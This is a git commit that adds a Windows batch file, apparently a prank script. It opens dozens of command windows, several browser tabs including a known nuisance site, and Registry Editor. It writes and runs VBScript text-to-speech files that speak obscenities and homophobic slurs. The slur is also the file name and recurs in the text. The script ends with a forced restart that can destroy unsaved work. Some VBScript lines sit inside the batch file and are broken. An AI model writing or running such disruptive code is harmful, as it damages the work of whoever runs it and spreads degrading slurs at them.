a8b36e1304b1141f7bd5e3205c41bf00a7823a57
MailaAbendan <abendan.maila16@gmail.com>
2025-05-25 19:09:51 +0800

    Add files via upload

---
+++ FAGGOT.bat
@@ -0,0 +1,87 @@
+@echo off
+title FAGGOT
+echo WHAT THE FUCK IS THIS
+pause >nul
+echo YO IS THAT YOUR FILE
+pause >nul
+echo THAT'S IT I WILL HANG YOUR PC
+pause >nul
+start https://youtu.be/Ee_uujKuJMI
+start https://youtu.be/2_Ur5IjW_c8
+start https://en.wikipedia.org/wiki/BonziBuddy
+start https://youareanidiot.cc/
+start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Registry Editor.lnk"
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start cmd
+start msedge
+start cmd
+start https://gifdb.com/images/high/old-man-twerking-on-bed-05ck6ft0z5e9zb4n.webp
+start https://ichef.bbci.co.uk/ace/standard/976/cpsprodpb/C279/production/_98158794_gettyimages-478845068.jpg
+if exist speech.Vbs del speech.Vbs
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=BITCH ASSHOLE FOR FAGGOT AHOLE WHAT THE FUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUCK!"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+timeout 5 >nul
+if exist speech.Vbs del speech.Vbs
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=I'II RIP YOUR BANANA AND BALLS"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+timeout 5 >nul
+if exist speech.Vbs del speech.Vbs
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=AMERICAN IDIOT FOR THE FUCKEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEER"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+timeout 5 >nul
+del speech.Vbs
+MsgBox "FAGGOT!", vbCritical, "Error"
+If CreateObject("Scripting.FileSystemObject").FileExists("Error.vbs") Then
+    MsgBox "Error.vbs exists!", vbExclamation, "Notice"
+    ' You could add code here to run the Error.vbs script if desired.
+End If
+start cmd
+prompt FAGGOT BITCH ASSHOLE MY ASS!
+start cmd
+start cmd
+pause >nul
+shutdown /r /t 12 /f
